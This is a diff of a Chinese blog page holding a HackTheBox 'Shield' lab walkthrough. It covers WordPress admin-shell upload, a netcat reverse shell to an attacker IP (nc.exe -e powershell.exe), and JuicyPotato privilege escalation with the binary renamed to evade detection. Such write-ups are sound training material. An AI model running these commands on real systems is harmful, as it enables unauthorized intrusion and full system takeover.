@@ -6,12 +6,12 @@
   <meta name="keywords" content=" HackTheBox ">
   <meta name="description" content="HackTheBox-Shield | colind0pe&#39;s blog">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-<meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#x31;&amp;#x33;&amp;#55;&amp;#48;&amp;#50;&amp;#50;&amp;#x37;&amp;#57;&amp;#x39;&amp;#54;&amp;#64;&amp;#113;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;">
+<meta name="description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#x31;&amp;#x33;&amp;#55;&amp;#x30;&amp;#x32;&amp;#50;&amp;#55;&amp;#57;&amp;#57;&amp;#x36;&amp;#x40;&amp;#x71;&amp;#x71;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#109;">
 <meta property="og:type" content="website">
 <meta property="og:title" content="关于">
 <meta property="og:url" content="http://example.com/about/index.html">
 <meta property="og:site_name" content="colind0pe&#39;s blog">
-<meta property="og:description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#x31;&amp;#x33;&amp;#55;&amp;#48;&amp;#50;&amp;#50;&amp;#x37;&amp;#57;&amp;#x39;&amp;#54;&amp;#64;&amp;#113;&amp;#x71;&amp;#46;&amp;#x63;&amp;#111;&amp;#x6d;">
+<meta property="og:description" content="个人简介colind0pe, 网络空间安全专业本科在读，目前从事安全方面的实习工作 联系我WeChat：hl_lhcq 邮箱：&amp;#x31;&amp;#x33;&amp;#55;&amp;#x30;&amp;#x32;&amp;#50;&amp;#55;&amp;#57;&amp;#57;&amp;#x36;&amp;#x40;&amp;#x71;&amp;#x71;&amp;#46;&amp;#x63;&amp;#x6f;&amp;#109;">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-09-30T02:47:26.235Z">
 <meta property="article:modified_time" content="2021-09-30T02:47:26.235Z">
@@ -299,7 +299,7 @@
     </div>
     <div class="article-meta">
         
-            发布时间 : <time class="date" title='最后更新: 2021-09-29 17:27:51'>2021-08-18 17:05</time>
+            发布时间 : <time class="date" title='最后更新: 2021-09-30 21:32:02'>2021-08-18 17:05</time>
         
     </div>
     <div class="article-meta">
@@ -339,58 +339,58 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png" alt="image-20210818093916007"></p>
+        <h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://i.loli.net/2021/08/18/JNCVaw9LHIbsg3t.png"></p>
 <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>端口扫描</strong>：</p>
 <pre><code>namp -A -T4 10.10.10.29
 </code></pre>
 <p>发现80、3306两个端口，IIS 10.0和MySQL，服务器操作系统为Windows</p>
-<p><img src="https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png" alt="image-20210818094018688"></p>
+<p><img src="https://i.loli.net/2021/08/18/HW1B7cVIfSkOhjw.png"></p>
 <p><code>--script vuln</code>参数扫描常见漏洞 ，发现wordpress目录，已经扫到了登录地址</p>
-<p><img src="https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png" alt="image-20210818094219984"></p>
+<p><img src="https://i.loli.net/2021/08/18/sWYHtKiGoMcAaBZ.png"></p>
 <p><strong>目录扫描</strong>，也发现wordpress目录</p>
-<p><img src="https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png" alt="image-20210818094303364"></p>
+<p><img src="https://i.loli.net/2021/08/18/BjKiP1malH3YsuM.png"></p>
 <p><strong>Wpscan分析</strong>，可以看到wordpress的版本</p>
 <pre><code>wpscan --url http://10.10.10.29/wordpress
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png" alt="image-20210818094335679"></p>
+<p><img src="https://i.loli.net/2021/08/18/o7IeKRkylwbXUn9.png"></p>
 <h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><p>用上一台靶机的账号密码可以登录后台<code>admin</code>:<code>P@s5w0rd!</code></p>
-<p><img src="https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png" alt="image-20210818094805320"></p>
+<p><img src="https://i.loli.net/2021/08/18/h7Av2EPBGHcOQus.png"></p>
 <p>知道wordpress admin用户密码的情况下，可以使用msf的wp_admin_shell_upload模块来攻击，使用模块</p>
-<p><img src="https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png" alt="image-20210818095004384"></p>
+<p><img src="https://i.loli.net/2021/08/18/DvtE9xOQMcVGirR.png"></p>
 <p>设置参数</p>
-<p><img src="https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png" alt="image-20210818095018168"></p>
+<p><img src="https://i.loli.net/2021/08/18/HdxmVPoLYhGXpQi.png"></p>
 <p>执行exploit命令后，获得shell</p>
-<p><img src="https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png" alt="image-20210818095032876"></p>
+<p><img src="https://i.loli.net/2021/08/18/IEwiRplZgf9TKaG.png"></p>
 <p>在shell中执行命令</p>
-<p><img src="https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png" alt="image-20210818095119681"></p>
+<p><img src="https://i.loli.net/2021/08/18/srdiD4wGRj6Y28b.png"></p>
 <p>查看wp-config.php，发现敏感信息</p>
-<p><img src="https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png" alt="image-20210818095132354"></p>
+<p><img src="https://i.loli.net/2021/08/18/VhwTivWuomxFJ6P.png"></p>
 <p><strong>反弹shell</strong>：</p>
 <p>在kali终端输入nc -nlvp 1234，用来在本机启动一个监听端口</p>
-<p><img src="https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png" alt="image-20210818095328033"></p>
+<p><img src="https://i.loli.net/2021/08/18/vxTqUfBDVaeGoh9.png"></p>
 <p>在meterpreter中执行nc命令来连接本机监听端口，使用netcat获得windows shell</p>
-<p><img src="https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png" alt="image-20210818095337355"></p>
-<p><img src="https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png" alt="image-20210818095342874"></p>
+<p><img src="https://i.loli.net/2021/08/18/1pl42ztmeAabDH6.png"></p>
+<p><img src="https://i.loli.net/2021/08/18/3NOZ5os7CcgDY6i.png"></p>
 <p>查看当前用户</p>
-<p><img src="https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png" alt="image-20210818095351717"></p>
+<p><img src="https://i.loli.net/2021/08/18/iBAZEls5vNMDaCV.png"></p>
 <p><strong>提权:</strong></p>
 <p>使用juicy-potato提权，将JuicyPotato.exe重命成js.exe，防止被对方检测到</p>
 <p>将js.exe上传到对方机器</p>
-<p><img src="https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png" alt="image-20210818095416095"></p>
+<p><img src="https://i.loli.net/2021/08/18/DnehVMrIUajwFxO.png"></p>
 <p>在windows shell中生成一个bat脚本：</p>
 <pre><code>echo START C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -e powershell.exe 10.10.14.107 1111 &gt; shell.bat
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png" alt="image-20210818095451841"></p>
+<p><img src="https://i.loli.net/2021/08/18/fZpgGSrAEs9dial.png"></p>
 <p>在本机使用nc创建一个监听端口，用来接收提权后的windows shell</p>
-<p><img src="https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png" alt="image-20210818095504339"></p>
+<p><img src="https://i.loli.net/2021/08/18/bWQDZ2VAGyPEIUl.png"></p>
 <p>运行juicy-potato提权：</p>
 <pre><code>js.exe -t * -p C:\inetpub\wwwroot\wordpress\wp-content\uploads\shell.bat -l 1337
 </code></pre>
-<p><img src="https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png" alt="image-20210818095601465"></p>
+<p><img src="https://i.loli.net/2021/08/18/4oZuXGiTzAqLfr9.png"></p>
 <p>获得system权限的windows shell</p>
-<p><img src="https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png" alt="image-20210818095611655"></p>
+<p><img src="https://i.loli.net/2021/08/18/8kDL9GwTJj2mexP.png"></p>
 <p>在管理员账户的桌面目录下找到flag</p>
-<p><img src="https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png" alt="image-20210818095622321"></p>
+<p><img src="https://i.loli.net/2021/08/18/MVPFeo2z4nisyDp.png"></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1370227996@qq.com </span>
